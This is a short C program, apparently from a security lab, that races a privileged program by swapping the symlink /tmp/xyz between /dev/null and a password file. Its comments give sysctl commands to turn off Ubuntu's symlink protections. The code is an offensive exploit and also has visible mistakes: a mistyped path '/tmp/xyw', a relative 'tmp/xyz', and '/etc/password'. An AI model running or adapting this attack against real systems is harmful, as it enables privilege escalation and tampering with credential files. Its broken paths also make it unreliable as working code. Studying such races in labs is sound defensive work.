//on ubuntu 12.04
//$sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
//on ubuntu 16.04
//$sudo sysctl -w fs.protected_symlinks=0


#include<unistd.h>
int main(){
    while(1){
        unlink("/tmp/xyw");
        symlink("/dev/null","tmp/xyz");
        usleep(1000);
        unlink("/tmp/xyz");
        symlink("/etc/password","/tmp/xyz");
        usleep(1000);

    }
    return 0;
}